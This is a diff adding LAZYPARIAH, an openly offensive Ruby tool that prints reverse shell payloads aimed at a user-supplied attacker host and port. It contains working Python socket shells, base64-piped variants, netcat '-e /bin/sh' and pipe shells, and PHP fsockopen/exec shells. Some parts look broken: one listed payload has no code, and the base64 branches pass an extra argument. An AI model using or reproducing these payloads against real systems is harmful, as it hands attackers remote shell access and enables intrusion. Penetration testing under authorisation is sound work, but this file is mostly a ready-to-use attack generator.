@@ -1,0 +1,195 @@
+#!/usr/bin/env ruby
+#
+# Title: LAZYPARIAH
+# Version: 0.1.0
+# Description:
+#	LAZYPARIAH is a simple tool for generating various reverse shell payloads
+#	on the fly. It is intended to be used only in authorised circumstances by
+#	qualified penetration testers, security researchers and red team professionals.
+#
+# Copyright (C) 2020 Peter Bruce Funnell
+#
+# This program is free software: you can redistribute it and/or modify it under the terms of the GNU
+# General Public License as published by the Free Software Foundation, either version 3 of the License,
+# or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even
+# the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public
+# License for more details.
+#
+# You should have received a copy of the GNU General Public License along with this program. If not,
+# see <https://www.gnu.org/licenses/>.
+
+# Load the necessary gems.
+require "base64"
+require "optparse"
+require "erb"
+
+# Define constants.
+PROGRAM_NAME = "LAZYPARIAH".freeze()
+PROGRAM_VERSION = "0.1.0".freeze()
+EXECUTABLE_NAME = "lazypariah".freeze()
+
+# Define payload list.
+PAYLOAD_LIST = [
+	"python",
+	"python3_c",
+	"python2_c",
+	"python_c",
+	"python3_b64",
+	"python2_b64",
+	"python_b64",
+	"nc",
+	"nc_pipe",
+	"php_fd_3",
+	"php_fd_4",
+	"php_fd_5",
+	"php_fd_6",
+	"php_fd_3_c",
+	"php_fd_4_c",
+	"php_fd_5_c",
+	"php_fd_6_c",
+	"php_fd_3_tags",
+	"php_fd_4_tags",
+	"php_fd_5_tags",
+	"php_fd_6_tags",
+	"php_dev_tcp_tags"
+].sort()
+
+# Define function for displaying program information.
+def prog_info(donation_info=true)
+	puts("#{PROGRAM_NAME} #{PROGRAM_VERSION}")
+	puts("Copyright (C) 2020 Peter Bruce Funnell")
+	if donation_info
+		puts("\nBTC Donation Address (Author): 3EdoXV1w8H7y7M9ZdpjRC7GPnX4aouy18g")
+	end
+end
+
+# Initialise command line argument parser.
+option_parser = OptionParser.new do |options|
+	options.banner = "\nUsage:\t#{EXECUTABLE_NAME} [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>\n"
+	options.banner << "Note:\t<ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.\n\n"
+	options.banner << "Example:\tlazypariah -u python3_b64 10.10.14.4 1555\n"
+	options.banner << "Example:\tlazypariah python2_c malicious.local 1337\n\n"
+	options.banner << "Valid Payloads:\n"
+	PAYLOAD_LIST.each do |p|
+		options.banner << "#{" "*4}#{p}\n"
+	end
+	options.banner << "\nValid Options:\n"
+	options.on("-h", "--help", "Display help text and exit.")
+	options.on("-l", "--license", "Display license information and exit.")
+	options.on("-u", "--url", "URL-encode the payload.")
+	options.on("-v", "--version", "Display version information and exit.\n\n")
+end
+
+# Define port_check method for strings.
+class String
+	def port_check()
+		(self.to_i.to_s == self) and (self.to_i >= 0 and self.to_i <= 65535)
+	end
+end
+
+# Define print_output.
+def print_output(s, url_encode=false)
+	if url_encode
+		print(ERB::Util.url_encode(s))
+	else
+		print(s)
+	end
+end
+
+# Attempt to parse command line arguments.
+begin
+	arguments = Hash.new()
+	option_parser.parse!(into: arguments)
+	if arguments[:version]
+		prog_info(donation_info=false)
+		exit()
+	else
+		if arguments.length < 1 and ARGV.length < 1
+			prog_info()
+			puts("\nNo command line arguments were detected. Please consult the help text below for details on how to use #{PROGRAM_NAME}.\n")
+			puts(option_parser)
+			exit()
+		elsif arguments[:help]
+			prog_info()
+			puts(option_parser)
+			exit()
+		elsif arguments[:license]
+			prog_info(donation_info=false)
+			puts("\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.")
+		elsif ARGV.length < 3
+			prog_info()
+			puts("\nThe command line arguments given to #{PROGRAM_NAME} were insufficient. #{PROGRAM_NAME} requires a payload type, attacker IP address and an attacker port in order to generate a reverse shell payload.\n")
+			puts(option_parser)
+			exit()
+		elsif ARGV.length > 3
+			prog_info()
+			puts("\nToo many command line arguments were given to #{PROGRAM_NAME}.\n")
+			puts(option_parser)
+			exit()
+		elsif not PAYLOAD_LIST.include?(ARGV[0])
+			prog_info()
+			puts("\n#{PROGRAM_NAME} did not recognise the specified payload. Please consult the valid list of payloads below.\n")
+			puts(option_parser)
+			exit()
+		elsif not ARGV[2].port_check()
+			prog_info()
+			puts("\nThe specified port was invalid. Please specify a port between 0 and 65535 (inclusive).\n\n")
+		else
+			url_encode = arguments[:url] ? true: false
+			case ARGV[0]
+			when "python"
+				print_output("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode)
+			when "python3_c"
+				print_output("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
+			when "python2_c"
+				print_output("python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
+			when "python_c"
+				print_output("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode=url_encode)
+			when "python3_b64"
+				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode)
+				print_output("echo #{code} | base64 -d | python3")
+			when "python2_b64"
+				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode)
+				print_output("echo #{code} | base64 -d | python2")
+			when "python_b64"
+				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode)
+				print_output("echo #{code} | base64 -d | python")
+			when "nc"
+				print_output("nc -e /bin/sh #{ARGV[1]} #{ARGV[2]}", url_encode=url_encode)
+			when "nc_pipe"
+				print_output("/bin/sh | nc #{ARGV[1]} #{ARGV[2]}", url_encode=url_encode)
+			when "php_fd_3"
+				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");", url_encode=url_encode)
+			when "php_fd_4"
+				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");", url_encode=url_encode)
+			when "php_fd_5"
+				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");", url_encode=url_encode)
+			when "php_fd_6"
+				print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");", url_encode=url_encode)
+			when "php_fd_3_c"
+				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", url_encode=url_encode)
+			when "php_fd_4_c"
+				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");'", url_encode=url_encode)
+			when "php_fd_5_c"
+				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");'", url_encode=url_encode)
+			when "php_fd_6_c"
+				print_output("php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");'", url_encode=url_encode)
+			when "php_fd_3_tags"
+				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&3 >&3 2>&3\");?>", url_encode=url_encode)
+			when "php_fd_4_tags"
+				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&4 >&4 2>&4\");?>", url_encode=url_encode)
+			when "php_fd_5_tags"
+				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&5 >&5 2>&5\");?>", url_encode=url_encode)
+			when "php_fd_6_tags"
+				print_output("<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&6 >&6 2>&6\");?>", url_encode=url_encode)
+			end
+		end
+	end
+rescue OptionParser::InvalidOption, OptionParser::MissingArgument
+	# Invalid command line arguments were detected. Say so, display the help text, and exit.
+	puts("\nOne or more command line arguments were invalid.\n")
+	puts(option_parser)
+	exit()
+end
